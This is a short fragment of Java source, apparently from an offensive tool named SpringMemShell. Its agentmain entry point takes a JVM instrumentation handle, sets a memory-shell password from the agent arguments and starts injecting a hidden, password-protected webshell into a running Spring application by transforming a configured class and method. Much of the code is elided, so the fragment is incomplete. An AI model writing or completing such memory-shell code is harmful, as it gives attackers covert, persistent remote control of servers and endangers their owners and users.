...
public class SpringMemShell {
    public static final String TransformedClassName = ShellConfig.SpringMemShellConfig.TransformedClassName;
    public static final String TransformedMethodName = ShellConfig.SpringMemShellConfig.TransformedMethodName;
    ...
    public static void agentmain(String agentArgs, Instrumentation inst) throws ClassNotFoundException, UnmodifiableClassException, IOException {
        i = inst;
        if (agentArgs != null) {
            ShellConfig.SpringMemShellConfig.MemShellPassword = agentArgs;
        }
        start();
    }
